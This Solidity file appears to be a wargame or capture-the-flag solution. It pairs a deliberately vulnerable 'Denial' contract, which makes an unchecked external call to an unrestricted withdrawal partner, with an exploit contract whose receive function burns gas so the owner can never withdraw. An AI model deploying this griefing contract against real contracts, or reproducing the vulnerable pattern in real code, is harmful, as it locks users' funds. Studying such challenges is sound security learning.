// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/**
 * Since the goal is to stop owner from withdrawing funds, the partner can just waste gas
 * when it gets control of execution because of `.call`. That way owner can never be able to
 * withdraw without setting a new partner.
 * 
 * Note that this has become possible because of limitation on how much gas transaction can use.
 */

contract ExploitContract {
    Denial private dripWallet;

    constructor(Denial dripWallet_) {
        dripWallet = dripWallet_;
    }

    receive() external payable {
        while (gasleft() > 2300) { }
    }
}